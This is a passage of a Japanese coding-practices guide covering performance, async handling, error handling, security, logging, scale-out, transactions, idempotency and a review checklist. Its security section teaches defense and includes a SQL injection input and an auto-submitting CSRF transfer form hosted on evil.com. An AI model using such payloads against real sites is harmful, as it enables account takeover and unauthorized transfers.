for (const order of orders) order.user = userById.get(order.userId);
```

メモリ上の `find` なら1回数マイクロ秒だが、DB/API 呼び出しは数ミリ〜数十ミリ秒。**ループの中に I/O を見つけたら、まず「まとめて1回にできないか」を疑う**。ORM だと明示ループが無くても、`orders` を回して各 `order.user` に触れるたび裏でクエリが飛ぶ**遅延ロード**で同じことが起きる。`JOIN`／`include`（eager load）でまとめて取る。

**その他のあるある**

```ts
// ✗ 最安値がほしいだけなのに全体を並べ替える（O(n log n)）
const cheapest = [...products].sort((a, b) => a.price - b.price)[0];
// ✓ 一度舐めれば足りる（O(n)）
const cheapest = products.reduce((min, p) => (p.price < min.price ? p : min));
```

> 最小の**値**だけでよければ `Math.min(...products.map(p => p.price))` が素直。上の `reduce` は「どの商品が最安か」という**オブジェクトそのもの**がほしいときの形。「最小の**値**がほしいのか、最小の**要素**がほしいのか」を区別して選ぶ。（`Math.min(...map(...))` は2回舐めるので厳密には手数 2n だが、`reduce` の n と同じ **O(n)**。理由は章末コラム。）
>
> ※ `Math.min(...arr)` はスプレッド展開なので、要素が数万を超える巨大配列だと引数上限（`RangeError`）に当たりうる。その規模では、スプレッドを使わず1パスで畳み込む `arr.reduce((m, x) => Math.min(m, x), Infinity)`（またはループ）が安全。

```ts
// ✗ ループの回数だけ、同じ Set を毎回作り直している
for (const x of items) if (new Set(banned).has(x.id)) reject(x);
// ✓ ループの外で1回だけ作る（毎回変わらないものはループの外へ）
const bannedSet = new Set(banned);
for (const x of items) if (bannedSet.has(x.id)) reject(x);
```

**大量データをメモリに載せきらない（ページング／ストリーミング）**

ここからは、もう一方の軸である**空間（メモリ）**。件数が実行時まで決まらないデータ（ユーザー・注文履歴・ログ…）を一度に全件メモリへ載せると、件数の増加とともにメモリを食い潰し、いずれ **OOM で落ちる**。時間が O(n) でも、n がメモリに載らなければ意味がない。

- 一覧表示は**ページング**（`LIMIT`/`OFFSET` やカーソル）で、必要な1ページ分だけ取る。
- 全件処理は**ストリーミング／バッチ**（一定量ずつ）にして、メモリ使用量を件数に依らず一定に保つ。

```ts
// ✗ 全件をメモリに載せてから処理。件数が増えるほど危険で、いつか OOM
const orders = await db.query('SELECT * FROM orders'); // 数百万件を1つの配列に
for (const o of orders) process(o);

// ✓ 一定量ずつ取り出して処理。メモリは件数によらず一定
for await (const chunk of db.stream('SELECT * FROM orders', { batch: 1000 })) {
  for (const o of chunk) process(o);
}
```

`SELECT *` で全行、巨大ファイルを `readFileSync` で丸ごと、API の全ページを一度に——などは同じ罠。**「このデータは将来どこまで増えるか」を問い、青天井なら最初からページング／ストリーミングで書く**。

> **コラム：`O(2n)` はなぜ `O(n)` に丸まるのか**
>
> 前出の `Math.min(...products.map(p => p.price))` は、手数で数えると **2n**——`map` が全要素を1回舐めて価格の配列を作り（n 回）、`Math.min` がそれをもう1回舐めて最小を探す（n 回）ので、n＋n。では、なぜ計算量では `O(n)` と書くのか。
>
> 計算量（O 記法）は「入力 n が増えたとき、時間が**どういう伸び方をするか**」だけを見る指標で、実際の手数そのものではない。`2n` も `n` も「n を2倍にすれば時間も2倍」という**線形の伸び**は同じなので、定数倍（2倍）は落として `O(2n) = O(n)` と丸める。
>
> 一方 `sort` の `O(n log n)` は、n を2倍にすると2倍より増える＝**伸び方のクラスが違う**ので丸められない。つまり「`2n` と `n` は同じ土俵、`n log n` は別の土俵」。この章で潰したかったのは"土俵をまたぐ"無駄（`O(n²)` や `O(n log n)` を `O(n)` にする）であって、`2n` vs `n` のような**同じ土俵の中の定数倍**は、日常規模では誤差——読みやすさで選んでよい。

---

## 9. 非同期・並行処理

> ここまでのコードは `async/await` に満ちていた。最後に、その非同期を「速く・安全に」束ねる勘所を押さえる。舞台は**1プロセスの中**——複数インスタンスにまたがる並行は §13 で扱う。

### 9.1 独立した非同期は直列に積まない

`await` を1行ずつ積むと、**互いに独立した処理まで順番待ち**になる。依存が無いなら `Promise.all` で同時に走らせる。

```ts
// ✗ user と order は独立なのに直列で待つ（所要 = 2つの合算時間）
const user = await fetchUser(userId);
const order = await fetchOrders(orderId);

// ✓ 独立なら同時に走らせる（所要 = 遅いほうだけ）
const [user, order] = await Promise.all([fetchUser(userId), fetchOrders(orderId)]);
```

ただし判断すべきは「**本当に独立か**」。`order` の取得に `user` の結果が要るなら、直列が正しい——順序の制約を無視して並行にすると壊れる。まず依存関係という本質を捉えてから束ねる。

### 9.2 ループの中の await は N+1 の再来（§8）

ループで1件ずつ `await` するのは、§8 で見た N+1 と同じ構図。まとめて1回にできないか、できないなら並行化できないかを疑う。

```ts
// ✗ 100件を1件ずつ順番に待つ（§8 の N+1）
for (const id of ids) {
  results.push(await fetchOrder(id));
}

// ✓ まとめて取れるならまとめる（最良）
const results = await db.orders.findByIds(ids);

// ✓ まとめられない独立呼び出しなら、並行にして待ち時間を畳む
const results = await Promise.all(ids.map(id => fetchOrder(id)));
```

> 並行数には限度がある。数千件を一気に `Promise.all` すると、相手（DB・API）を過負荷にしたり接続上限に当たる。件数が青天井なら、一定数ずつ区切って流す（§8 のページング／バッチと同じ発想）。

### 9.3 「全部成功」か「全部待つ」かを選ぶ

`Promise.all` は**1つでも失敗した瞬間に全体が reject** する（残りは待たずに打ち切り）。「1つでも欠けたら意味がない」ときの fail-fast（§6.5）として正しい。一方「成功したものだけ集め、失敗は個別に扱いたい」なら `Promise.allSettled`。

```ts
// 1つでも欠けたら成り立たない → all（どれか失敗で即 reject）
const [a, b] = await Promise.all([loadA(), loadB()]);

// 各通知は独立。1件失敗しても残りは送りたい → allSettled
const results = await Promise.allSettled(users.map(u => notify(u)));
const failed = results.filter(r => r.status === 'rejected');
```

### 9.4 Promise を握りつぶさない（await 忘れ）

`await` を付け忘れた非同期呼び出しは、**エラーが誰にも捕まらないまま消える**（unhandled rejection）。§10「握りつぶさない」の非同期版だ。投げっぱなしの Promise を作らない——待つなら `await`、意図的に待たないなら「待たない」と分かる形にする。

```ts
// ✗ await 忘れ。saveLog が失敗しても、この関数は成功したふりで先へ進む
async function handle(order: Order) {
  saveLog(order);          // ← Promise を放置。中の例外は闇に消える
  return { ok: true };
}

// ✓ 結果や失敗に責任を持つなら await する
async function handle(order: Order) {
  await saveLog(order);
  return { ok: true };
}
```

### 9.5 競合状態（レースコンディション）に注意する

複数の非同期処理が**同じ状態を読み書き**すると、実行順によって結果が変わる（レースコンディション）。§7 の「共有状態を書き換えない」を非同期でも守る——共有の可変状態を `await` をまたいで読み書きしない。どうしても要るなら、順序を直列化するか、**分割不能な1操作（DB のアトミックな更新やトランザクション）**に寄せる。

```ts
// ✗ read → await → write の隙間に別の実行が割り込み、更新が上書きで消える（lost update）
const count = await counter.get();
await doSomething();
await counter.set(count + 1);   // 割り込んだ側の +1 が消える

// ✓ 「1増やす」を分割不能な1操作として DB 側に任せる
await counter.increment(1);     // アトミックな更新（読み書きの隙間が無い）
```

`increment` の中身は、アプリで読んで足して書き戻すのではなく、**DB に「現在値に加算しろ」という1文を投げる**だけ。加算は DB 側で分割不能に行われるので、読み取りと書き込みの隙間が存在せず、同時に呼ばれても取りこぼしが起きない。

```ts
// increment の内部：値をアプリへ持ち帰らず、DB 内で加算まで完結させる
async function increment(by: number): Promise<void> {
  // SQL なら1文： UPDATE counters SET count = count + ? WHERE id = ?
  await db.execute('UPDATE counters SET count = count + ? WHERE id = ?', [by, this.id]);
  // Redis なら INCRBY key by、といった「加算そのものが1コマンド」の API を使う
}
```

---

## 10. エラーハンドリング

> 正常系を整えたら、**異常系**。エラーは握りつぶさず、意味を持たせて扱う。

- **明確な目的がある場合以外は catch しない。**
  500エラーになってよい例外は、すべて**共通例外処理**に任せる。
- **catch しても握りつぶさない。** エラーはエラーのままにする。
  原則 **throw し直す**（※よほど練られた walk around を除く）。

```ts
// ✗ 握りつぶし：原因が闇に消え、バグが表面化しない最悪のパターン
try {
  await saveOrder(order);
} catch (e) {
  // 何もしない / console.log だけ
}

// ✗ 目的もなく catch して 200 を返す（異常が正常として扱われる）
try {
  await saveOrder(order);
} catch (e) {
  return { ok: true };
}

// ✓ 目的がないなら catch しない。共通例外処理（500）に委ねる
await saveOrder(order);

// ✓ catch するのは「ここで意味のある回復・変換をする」明確な目的があるときだけ
try {
  await chargeCreditCard(order);
} catch (e) {
  // 決済失敗という業務上の意味に変換して投げ直す（握りつぶさない）
  throw new PaymentFailedError('決済に失敗しました', { cause: e });
}
```

「業務上の意味」に変換して投げ直すと、**呼び出し元がその意味を受けて意味のある制御を書ける**。
ポイントは、意味のある1つ（`PaymentFailedError`）だけを捕まえ、**それ以外の想定外は握らずに throw し直す**こと。

```ts
async function handleCheckout(order: Order) {
  try {
    await placeOrder(order); // 内部で chargeCreditCard → PaymentFailedError が起きうる
  } catch (e) {
    if (e instanceof PaymentFailedError) {
      // 決済失敗は「異常」ではなく想定内の業務フロー。再入力を促して正常系に戻す
      showPaymentRetryDialog();
      return;
    }
    throw e; // それ以外の想定外は握りつぶさず、共通例外処理（500）へ委ねる
  }
}
```

`PaymentFailedError` という型があるおかげで、呼び出し元は「決済だけは想定内として拾い、他は拾わない」という**きめ細かい分岐**ができる。もし汎用の `Error` を投げていたら、拾うべきものと拾ってはいけないものを区別できない。

### 10.1 catch のログは「わかっていること」だけ書く

catch でログや throw をするとき、**実際に起きたことより一歩踏み込んだ「決めつけ」を書いてしまう**ミスが多い。文言が原因を名指しするのに、その catch は本当はその原因を知らない——**概念がズレたログ**は、後から障害を追う人を誤った方向へ誘導する。

例として、認証エラーのとき 403 を返す API を呼び、そのレスポンスを使ってデータを組み立てる。全体を try/catch で囲っている。

```ts
// ✗ catch が「権限エラー」と決めつけている
try {
  const orders = await api.get('/orders'); // 通信断・タイムアウト・500・403… いずれでも落ちうる
  render(summarize(orders));               // ↑が通っても、この後段処理（自コード）でも落ちうる
} catch (e) {
  // この catch に来た原因は「ネットワーク切れ / 500 / 403 / summarize のバグ / ・・・・」のどれか分からない。
  // なのに 403（権限エラー）だと決めつけ、しかも唯一の事実である e も捨てている
  logger.warn('権限がありません');
  throw new ForbiddenError('権限がありません');
}
```

厄介なのは、この決めつけが**中途半端な知識から生まれる**ことだ。書き手は「この API は認証エラーのとき 403 を返す」と**知っている**。知っているがゆえに、catch を見た瞬間「ああ、あの 403 のことだな」と早合点し、自分が知っている1つの失敗モードで全体を代表させてしまう。だが `catch (e)` は try の中で起きた**あらゆる**失敗を受ける——通信断も、500 も、`summarize` の null 参照も、みな同じここに来る。真因が通信断や null 参照であっても、ログには「権限」と残り、**全員が権限まわりの調査へ誘導される**。おまけに、ForbiddenErrorをthrowしているので、本来 500 で直すべき自コードのバグを、利用者には 403 と偽って見せることにもなる。「知っている失敗」ほど、**それだと決めつける前に `e` で確かめる**必要がある。

```ts
// ✓ 特別な対応をしたい事象だけを e から見分けて個別に処理し、それ以外は決めつけず投げ直す
try {
  const orders = await api.get('/orders');
  render(summarize(orders)); // summarize は集計不能なデータのとき SummaryError を投げうる
} catch (e) {
  if (e instanceof HttpError && e.status === 403) {
    // ① 権限エラーと確認できたときだけ、その意味を与えて再ログインへ促す
    logger.warn('注文一覧の取得で権限エラー(403)', { cause: e });
    throw new ForbiddenError('権限がありません', { cause: e });
  }
  if (e instanceof SummaryError) {
    // ② 集計エラーと確認できたときだけ、データ不整合として業務メッセージに変換する
    logger.warn('注文の集計に失敗（データ不整合）', { cause: e });
    throw new InvalidOrderDataError('注文データを生成できませんでした', { cause: e });
  }
  throw e; // ③ それ以外（通信断・500・想定外のバグ）は、握らず・言い換えず、そのまま投げる
}
```

原則：**ログや変換後の例外に与える「意味」は、`e` を調べて確認できた範囲だけにする。** 確認していない原因（`権限がありません`・`DBエラー`・`タイムアウト`）を決めつけない。やることは「**特別な対応をしたい事象だけを `e` から抽出し、それぞれに個別対応する**」——403 は権限案内へ、`SummaryError` は業務メッセージへ、と**確認できたものだけ**を扱い、残り（確認しようのない想定外）は §10 の基本どおり握らず throw し直す。これは前項の `PaymentFailedError` と同じ発想を、拾う事象が複数あるケースへ広げたもの。残すべき文脈（相関鍵）と `cause` の扱いは §12 のとおり。

---

## 11. セキュリティ

> 外に出す情報と、外から入ってくる操作の両方を疑う。基本姿勢は「**入力を信頼しない・内部を漏らさない・権限は必ずサーバーで確かめる**」。網羅ではなく、外してはいけない勘所を挙げる。

### 11.1 内部情報を外に漏らさない

- **プログラム言語やフレームワークに起因するエラーメッセージは、一切画面表示しない。APIからも返さない。** 内部情報を外部に流出させない。
- **外部に見せてよいのは、あえて見せることを意図して設計したメッセージのみ。**

```ts
// ✗ 内部のスタックトレース・SQL・フレームワークのメッセージが漏れる
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});

// ✓ 外部にはあらかじめ設計した安全なメッセージだけ。詳細はサーバー内ログへ
app.use((err, req, res, next) => {
  logger.error(err); // 詳細は内部ログにだけ残す
  res.status(500).json({ error: '処理中にエラーが発生しました。時間をおいて再度お試しください。' });
});
```

### 11.2 入力を信頼しない（インジェクション：SQL・XSS）

外から来た値を、そのままクエリや HTML に埋め込まない。埋め込んだ瞬間、値が「データ」ではなく「**命令**」として解釈され、乗っ取られる。

```ts
// ✗ SQL を文字列連結：name に "' OR '1'='1" を入れられると条件が破られる
db.query(`SELECT * FROM users WHERE name = '${name}'`);
// ✓ 値はプレースホルダ（プリペアドステートメント）／ORM で渡す＝DB が「データ」として扱う
db.query('SELECT * FROM users WHERE name = ?', [name]);
```

> ORM（Prisma など）の型付きクエリは値を自動でパラメータ化するので、この対策は基本タダで効く。ただし「ORM だから全部安全」ではない——`$queryRawUnsafe` のような**生クエリ＋文字列連結**では自分で穴を開けられるし、パラメータ化が守るのは**値だけ**で、**テーブル名・カラム名・`ORDER BY`** などの識別子は対象外。識別子にユーザー入力を混ぜるなら、値の埋め込みではなく**許可リストで縛る**。

- **XSS**：外部由来の文字列を HTML として描かない。フレームワークの自動エスケープ（React の `{value}` など）に任せ、`dangerouslySetInnerHTML`／`innerHTML` を避ける（§4.6② の実例）。
- 同じ理屈で、OS コマンド・ファイルパス・正規表現なども、外部値をそのまま渡さない。「入力を境界で検証する（§6.5）」と表裏一体。

### 11.3 リクエストの正当性（CSRF / CORS）

名前が似ていて混同されがちだが、**別の問題を、別の仕組みで**扱う。CSRF は「攻撃者に**送らされた**状態変更リクエストを弾く」話、CORS は「別オリジンの JS に**レスポンスを読ませない**」話。片方はもう片方の代わりにならない。

**CSRF（クロスサイト・リクエスト・フォージェリ）**

ログイン中のユーザーに、本人も気づかぬうちに"状態を変えるリクエスト"を踏ませる攻撃。成立するのは、**ブラウザが Cookie を「送り先ドメイン」だけで自動付与する**から——どのページが発端でも、`yourbank.com` 宛のリクエストには被害者のセッション Cookie が勝手に付く。

```html
<!-- 攻撃者の evil.com に置かれた、開くだけで自動送信されるフォーム -->
<form action="https://yourbank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker"><input name="amount" value="100000">
</form>
<script>document.getElementById('f').submit()</script>
<!-- 被害者は evil.com を開いただけ。なのに本人のログインCookie付きで送金POSTが飛ぶ -->
```

防御は「**このリクエストは本当にうちの画面から来たか**」を確かめること：

- **CSRF トークン**：自分の画面にだけ、推測不能な使い捨てトークンを埋め込み、状態変更リクエストに同送させてサーバーで照合する。攻撃者のクロスサイトなページは**同一オリジンポリシーでそのトークンを読めない**ので、正しい値を付けられず弾かれる。
- **SameSite Cookie**：`SameSite=Lax`（現代ブラウザの既定）にすると、ブラウザは**別サイト発のリクエストに Cookie を付けない**。上のフォーム送金は Cookie が付かず認証切れになる。`Strict` はさらに強いが、外部リンクから来た初回遷移まで未ログイン扱いになり UX を壊しやすい。
- 前提として、**状態変更は必ず POST/PUT/DELETE に**。GET に副作用を持たせると、`<img src="…/delete">` を置くだけでフォームすら要らずに撃たれる。

**CORS（クロスオリジン・リソース・シェアリング）**

ブラウザの既定（同一オリジンポリシー）は、**ある画面の JS が"別オリジンの API レスポンスを読む"ことを禁じている**。CORS はそれを**例外的に緩める**仕組みで、サーバーが `Access-Control-Allow-Origin` で「このオリジンには読ませてよい」と申告する。つまり CORS は**防御を足す設定ではなく、既定の制限を開ける設定**。ここを取り違えると事故る：

- **緩めすぎない。** `Access-Control-Allow-Origin: *` を安易に付けない。信頼できるオリジンだけを**許可リスト**で列挙する。リクエストの `Origin` をそのまま反射（echo）するのは実質「全許可」で危険。
- **CORS はサーバーの防御ではない。** 効くのは**ブラウザの中だけ**。curl・サーバー間通信・改造クライアントは CORS を無視して普通に叩ける。だから CORS は認証・認可の代わりには決してならない（本物の防御は §11.4 でサーバーが行う）。
- **`Access-Control-Allow-Credentials: true`（Cookie 同送を許可）と `*` は併用できない。** 資格情報付きで許すなら、オリジンは必ず具体名で絞る（ブラウザが `*`＋credentials を拒否する）。

> **CSRF 対策が要るのはどんなときか**：判断基準は「Cookie かどうか」ではなく「**ブラウザが認証情報を自動で付けるか**」。Cookie セッション・Basic 認証・クライアント証明書のように**自動送信**される認証なら要る。一方 `Authorization: Bearer <token>` を JS で明示的に付ける方式は、攻撃者のクロスサイトなページがそのヘッダを付けられない（＆ localStorage を読めない）ので**原則不要**——ただしトークンを Cookie に入れて自動送信していれば、Cookie と同じく必要。

> **なぜ CORS は CSRF 対策にならないか**：CORS が止めるのは「レスポンスを**読む**こと」だけであり**通信自体はクロスオリジンでも成立する**。上のフォーム送金のような**リクエストの送信そのものは止めない**——ブラウザは送り、サーバーは処理し(たとえば**被害者から攻撃者へ送金処理が行われ**)、ただ攻撃者がその通信の結果を読めないだけ。CSRF は結果を読む必要がなく、状態さえ変われば成功なので、CORS があっても Cookie 認証なら別途 CSRF 対策が要る。

### 11.4 認証と認可（必ずサーバーで確かめる）

- **認証（誰か）と認可（何をしてよいか）は別物**。両方いる。
- **認可はサーバー側で必ずチェックする。** 画面でボタンを隠すのは UX であって防御ではない（API を直接叩かれれば素通り）。
- **IDOR**：`/orders/123` の `123` を書き換えれば他人の注文が見える、を防ぐ。「その資源は本当にこのユーザーのものか」を毎回確かめる。
- **最小権限**：トークン・DB ユーザー・API キー・クラウド IAM ロールには、**必要な操作を・必要な資源にだけ**与える。例：アプリの DB ユーザーは触るテーブルの `SELECT/INSERT/UPDATE/DELETE` だけ（`DROP` や他スキーマは不可、集計・閲覧系は読み取り専用ユーザー）／S3 を読むだけのロールは `s3:*` ではなく `s3:GetObject` を対象バケットに限定／外部連携キーも用途ぶんに絞る（送信専用・特定リポジトリのみ 等）。狙いは**破られた後の被害の封じ込め**——SQL インジェクション（§11.2）や鍵漏洩が起きても、消せる・読める範囲が最小で済む。壁が破られる前提で被害を小さくする隔壁で、fail-fast（§6.5）と同じ"失敗前提"の構えだ。

### 11.5 秘密情報とその他

- **秘密情報をコード／リポジトリに書かない。** API キー・DB パスワードは環境変数やシークレット管理へ。パスワードは §3 のとおり**ハッシュ化**して保存（生のまま持たない）。
- **通信は TLS（HTTPS）。**
- **依存ライブラリの脆弱性**を放置しない（定期的な監査・更新）。
- **レート制限**で総当たり（ブルートフォース）や乱用を抑える。

---

## 12. ログと可観測性

> 異常系のもう一つの備え。**本番で動き続ける**コードは、動いている最中に何が起きたかを、後から追える状態にしておく。

大げさな仕組みは要らない。まず土台として、次の3つが外れていなければ障害調査はだいたい足りる。

- **例外を握りつぶさない（§10）** ── 想定外は共通例外処理まで throw し直す。
- **stack trace を含む情報をそのまま残す** ── 例外を握らず投げれば、原因の場所ごと残る。自前で潰さない。
- **その出力（標準出力／ログ）がどこかに集約されている** ── 本番で問題が起きたとき、まず見に行ける場所に出ていること。

その上で、効くなら足す程度の話：

- **文脈の鍵を添える**：リクエスト ID・ユーザー ID・注文 ID など、あとで突き合わせられる識別子。1行で「どの処理の話か」が分かる（§10.1 の `cause` と併せて）。
- **秘匿情報は載せない**：パスワード・トークン・カード番号はログにも出さない（§11／§3 の `plaintextPassword` の区別が効く）。
- **レベルを使い分ける**：何でも `info` で流すと、本当に見たい異常が埋もれる。

要は「**例外を殺さず、stack を残し、拾える場所に出す**」。まずこれを外さないことが、凝ったログ設計より効く。

---

## 13. スケールアウトを前提に書く

> ここからは第4部。本番は、**自分の外の現実**——複数インスタンス・部分的な失敗・世界の時刻——を相手にする。まずこの章は「複数インスタンスで動く」前提から。どの1台に振られても正しく動くよう、状態を1台に閉じ込めない。

冗長化・オートスケールされた環境では、ロードバランサがリクエストを**どのインスタンスへ振るか分からない**し、インスタンスはいつ増減・再起動してもおかしくない。だから **各インスタンスは対等で使い捨て（ステートレス）** を前提に書く。複数リクエストで共有すべき状態を、特定インスタンスの**メモリやローカルディスク**に置くと、別の台に振られた瞬間に消える。

### 13.1 セッション・状態をインスタンスのメモリに持たない

セッションをアプリの**メモリ**に持つと、サーバーを複数台に増やした瞬間に壊れる——次のリクエストが別インスタンスに振られると、そこにセッションが無いからだ（ログイン直後に急にログアウトする、といった不可解な挙動になる）。複数台で使うなら、次のどちらかが要る。

- **共有ストアに外出しする**：セッションを Redis などインスタンスの外へ置き、どの台からも同じ状態を引く（原則こちら）。
- **スティッキーセッション**：同じ利用者を常に同じインスタンスへ振り分けて寄せる（手軽だが、その台が落ちると状態が失われ、負荷も偏る）。

同じ罠は、**インメモリキャッシュ・カウンタ・レート制限**にもある。各インスタンスがバラバラの値を持ってしまうので、共有すべきものは外部ストアに置く。

### 13.2 ローカルディスクに保存しない

アップロードされたファイルなどを**ローカルのファイルシステム**に保存すると、別インスタンスからは見えず、再デプロイやオートスケールでインスタンスごと消える。共有すべき成果物は **オブジェクトストレージ（S3 など）** に置く。

### 13.3 「自分だけが動いている」前提を置かない

cron やバックグラウンドジョブを素朴に書くと、**全インスタンスで同時に重複実行**される（通知が台数分だけ多重で飛ぶ、など）。「1つだけ動く」を担保するには、排他ロック・リーダー選出・専用ワーカーのいずれかが要る。

---

## 14. トランザクションと整合性

> 1つの業務操作が複数の書き込みに分かれるとき、その途中で失敗しても**中途半端な状態を残さない**。「全部成功、さもなくば全部なかったことに」を守るのがトランザクション。

### 14.1 「全部か、無か」で書き込む（原子性）

送金のように、**複数の更新が揃って初めて意味を持つ**操作を1つずつ順に書くと、途中で落ちたときに「引いたが足していない」不整合が残る。関連する書き込みは1つのトランザクションで囲み、どれか1つでも失敗したら**全部ロールバック**する。

```ts
// ✗ 2つの更新が別々。debit の後・credit の前で落ちると、お金が消える
await accounts.debit(from, amount);
await accounts.credit(to, amount);   // ここで例外が起きたら from だけ減ったまま

// ✓ 1トランザクションに束ねる。途中で失敗すれば両方なかったことになる
await db.transaction(async (tx) => {
  await tx.accounts.debit(from, amount);
  await tx.accounts.credit(to, amount);
});
```

§2.2 の CSV 取り込みで「全件そろって初めて保存」と言ったのは、まさにこれ——一部だけ登録された半端な状態を作らない、という整合性の話だった。

### 14.2 トランザクションで括れない相手に注意する

トランザクションが効くのは基本的に**同じ DB の中**だけ。「DB 更新＋メール送信」「DB 更新＋外部決済 API」のように、**外部の副作用はロールバックできない**——メールは送ってしまったら取り消せない。

- 取り消せない副作用（メール・課金・通知）は、**DB のトランザクションが確定してから**実行する。確定前に送ると、ロールバック時に「注文は消えたのにメールだけ届く」ことになる。
- それでも「DB は確定したが直後にメール送信が落ちた」ズレは残りうる。重要なものは、送信を記録して後で再試行する——この"やり直しても二重にならない"性質が次章 §15 冪等性だ。

### 14.3 不変条件は書き込みの境界で守る

「在庫は負にならない」「予約は定員を超えない」といった**不変条件**を、アプリのメモリ上でチェックしてから書くだけでは、競合（§9.5）で破れる——2つの処理が同時に「残り1」を見て、両方とも確保してしまう。DB の制約（`CHECK`・一意制約）や条件付き更新（`UPDATE … WHERE stock > 0`）で、**書き込みの瞬間に DB 側で守らせる**。

---

## 15. 冪等性（リトライ・重複に耐える）

> 本番では、**同じ操作が2回届く**ことが普通に起きる——ネットワークの再送、タイムアウト後のリトライ、ユーザーの二重クリック、キューの at-least-once 配信、cron の重複起動（§13.3）。**同じ操作を何回実行しても、結果が1回と同じ**であるように書く。これを冪等（idempotent）という。

### 15.1 なぜ「1回」を保証できないのか

「リクエストは1回だけ届く」とは仮定できない。決済 API を呼んでタイムアウトしたとき、本当に失敗したのか、成功したのに応答だけ届かなかったのかは、呼んだ側には分からない。だからクライアントはリトライする。冪等でないと、この再送が**二重課金・二重登録**になる。

### 15.2 冪等キーで「同じ操作」を見分ける

操作ごとに、クライアントが**一意なキー（冪等キー）**を付ける。サーバーは、そのキーで**すでに処理済みか**を記録・確認し、2回目以降は処理せず前回の結果を返す。

```ts
// ✓ 冪等キーで二重実行を弾く
async function charge(req: ChargeRequest) {
  const existing = await payments.findByIdempotencyKey(req.key);
  if (existing) return existing;   // 2回目以降は、前回の結果をそのまま返す（再課金しない）

  const result = await gateway.charge(req.amount);
  await payments.save({ key: req.key, result });
  return result;
}
```

キーの確認と保存の間も競合しうるので、**一意制約**（同じキーの2行目を DB が拒否）で守るのが確実（§14.3）。

### 15.3 そもそも冪等な操作に寄せる

- **「絶対値で設定」は冪等、「相対で増減」は冪等でない。** `status = 'paid'` に**する**更新は何回やっても同じだが、`count = count + 1` は回数分ずれる。可能なら「あるべき状態を設定する」形に寄せる。
- **UPSERT**（あれば更新・なければ挿入）や `DELETE`（何回消しても消えている）は、もともと冪等に振る舞わせやすい。
- 受信側で「この ID はもう処理した」を記録して弾くのは、キュー処理の定石。

> §14 と §15 は対で効く：トランザクションが「1回の操作を中途半端にしない」を守り、冪等性が「その操作が複数回届いても壊れない」を守る。合わせて、部分失敗とリトライがある世界で整合性を保つ。

---

## 16. チェックリスト

> ここまでの各章を、手を動かすときの問いに落とし込んだもの。実装・レビューのたびに立ち返る。

実装・レビュー時に、以下を自問する。

- [ ] このメソッドが何をするか、**短い一言**で説明できるか？（§2.1）
- [ ] 仕様をベタ書きしていないか。**概念のレール**の上に乗っているか？（§2.2）
- [ ] 名前を眺めるだけで処理の概要が読めるか？（名前警察・§3）
- [ ] 意味のある値を**マジックナンバー**のまま埋め込んでいないか？（§3）
- [ ] このファイル／関数の**責務**に見合わないことをやらせていないか？（§4.1）
- [ ] 1つの変数に**2つの意味**を持たせていないか。列挙（enum）の値は**対等**か、別の軸が混ざっていないか？（§4.2）
- [ ] 呼び出し元に**忖度**していないか？（お役所仕事になっているか＝§4.3）
- [ ] クラスの各メソッドの**抽象度**は揃っているか？（素通し・入力組み立て・出力変換が混在していないか＝§4.4）
- [ ] モジュール**依存の向き**は健全か？（ついでの import で横に結合していないか＝§4.5）
- [ ] 下層（計算・API）は**正しい値**を返すことに徹し、整形・見せ方を上層に任せているか？（§4.6）
- [ ] 「使いたいだけ」で**継承**していないか。委譲で足りないか？（§4.7）
- [ ] コンポーネントに取得・業務判断・表示を**詰め込んで**いないか？（§4.8）
- [ ] **使われていないコード**・仕様の書きかけを残していないか？（§1.1）
- [ ] 切り出して**資産化**できる汎用処理はないか？（§5.1）
- [ ] 似ているだけの**別概念を無理に共通化**していないか？（§5.2）
- [ ] もっと**直接的**な記法・論理展開はないか？（下流の結果でなく直接の原因で書く＝§6.1）
- [ ] 複雑な条件を**名前付きの合成フラグに括った**か。ブールは**肯定形**か（二重否定を避ける）？（§6.2）
- [ ] その合成フラグは**1つの判断に閉じて**いるか。別々の判断の材料を混ぜていないか？（§6.2）
- [ ] ネストを浅く、**早期リターン**で読みやすくしているか？（§6.3）
- [ ] その存在チェック・`?.`・`as` は、**型を正しく付ければ消せない**か？（§6.4）
- [ ] 外部からの入力を**境界で検証**しているか（fail-fast）？（§6.5）
- [ ] 既定を `const` にしているか。引数を**破壊的に変更**していないか？（§7.1・§7.2）
- [ ] 変数の**スコープ**を必要以上に広げていないか。`tmp`・`data` を使い回していないか？（§7.3）
- [ ] 計算（純粋）と副作用を**混ぜて**いないか？（§7.4）
- [ ] **ループの中でループ**していないか？（§8）
- [ ] 独立した非同期を直列で待っていないか。ループ内の `await`（N+1）や、**await 忘れ**の放置 Promise はないか？（§9）
- [ ] 目的もなく catch していないか？ エラーを**握りつぶして**いないか？（§10）
- [ ] 内部情報を含むエラーメッセージを**外部に出して**いないか？（§11.1）
- [ ] 外部入力を SQL／HTML／コマンドに**直接埋め込んで**いないか（インジェクション）？（§11.2）
- [ ] **認可をサーバー側で**確かめているか。ID 差し替えで他人の資源を触れないか（IDOR）？（§11.4）
- [ ] 秘密情報を**コード／リポジトリに**書いていないか。トークン・DB ユーザー等の権限は**最小**か？（§11.4・§11.5）
- [ ] 後から追えるよう、**文脈付きでログ**を残しているか。秘匿情報を載せていないか？（§12）
- [ ] 共有すべき状態（セッション・ファイル等）を**特定インスタンスのメモリ／ローカルディスク**に閉じ込めていないか？（§13）
- [ ] 複数の書き込みを**トランザクション**で束ねているか。中途半端な状態が残らないか？（§14）
- [ ] 同じ操作が2回届いても壊れないか（**冪等**）。リトライ・二重クリックに耐えるか？（§15）
- [ ] 触ったついでに、**小さな綻び**を直して去ったか？（ボーイスカウト・§5.3）
- [ ] 整理された上で、これ以上**少なく**できないか？（§1.2）

---

> 難しいことを処理できる人間を目指すのではなく、
> 難しいことを扱わなくても改修し続けられる、整理整頓されたプログラムを目指す。
